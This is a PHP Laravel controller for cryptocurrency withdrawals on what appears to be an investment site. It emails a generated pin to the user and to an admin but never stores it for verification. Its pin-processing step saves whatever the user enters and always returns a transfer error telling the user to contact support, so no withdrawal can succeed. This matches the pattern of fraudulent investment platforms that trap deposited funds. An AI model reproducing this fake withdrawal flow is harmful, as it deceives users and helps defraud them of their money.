<?php

namespace App\Http\Controllers;

use App\Mail\AdminWithdrawAlert;
use App\Mail\RequestWithdraw;
use App\User;
use App\Withdraw;
use App\WithdrawMethod;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;

class WithdrawController extends Controller
{
    public function withdraw()
    {
        $withdraw_m = WithdrawMethod::all();
        return view('dashboard.withdraw.withdraw', compact('withdraw_m'));
    }

    public function processWithdraw(Request $request)
    {
        $withdraw = new Withdraw();
        $withdraw->amount = $request->amount;
        $withdraw->user_id = Auth::id();
        $withdraw->wallet_type = $request->wallet_type;
        $withdraw->wallet_address = $request->wallet_address;
        $user = User::findOrFail($withdraw->user_id);
        $otpcode = mt_rand(111111,999999);
        $data = ['withdraw' => $withdraw, 'user' => $user, 'otpcode' => $otpcode];
        $withdraw->save();
        Mail::to($user->email)->send( new RequestWithdraw($data));
        Mail::to('admin@assetscryptoview.com')->send( new AdminWithdrawAlert($data));
        return redirect()->route('user.otpcode', $withdraw->id)->with('success_message', 'A withdrawal pin has been sent to your email, please enter your withdrawal pin to facilitate withdrawal/transfer of your fund');
    }

    public function otpcode($id)
    {
        $withdrawal = Withdraw::findorFail($id);
        return view('dashboard.withdraw.otp', compact('withdrawal'));
    }

    public function process_otp(Request $request)
    {
        $with_id = $request->withdrawal_id;
        $withdrawal = Withdraw::findOrFail($with_id);
        $withdrawal->update(['otp_code' => $request->otp_code]);
        return redirect()->back()->with('declined', "Error Transferring, Please Contact Account Support For Assistance");

    }
}
